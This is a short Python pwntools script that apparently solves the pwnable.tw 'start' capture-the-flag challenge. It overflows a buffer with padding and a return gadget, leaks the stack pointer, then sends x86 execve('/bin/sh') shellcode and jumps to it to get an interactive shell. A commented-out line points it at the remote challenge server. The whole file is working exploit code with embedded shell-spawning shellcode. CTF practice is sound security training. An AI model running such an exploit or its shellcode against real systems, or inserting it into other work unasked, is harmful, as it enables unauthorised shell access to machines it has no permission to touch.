from pwn import *

#context(terminal=['tmux', 'splitw', '-v'])

#RUN TMUX FIRST OR THIS WONT WORK LOL
context(terminal=['tmux', 'new-window'])

context(os = 'linux', arch = 'x86_64')
#context.arch = 'i386'

#p = gdb.debug('./start', 'b _start')
p = gdb.debug('./start')
#p = process('./start')
#p = remote('chall.pwnable.tw', 10000)
#gdb.attach(p)

rop_gadget = p32(0x08048087)


#context.log_level = 'DEBUG'

payload = 'A'*20 + rop_gadget


shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'


p.recvuntil("CTF:")

p.send(payload)

esp = u32(p.recv()[:4])

#print hex(esp)

stack_inject = "A"*20 + p32(esp + 20) + shellcode

#payload = blah

p.send(stack_inject)

p.interactive()
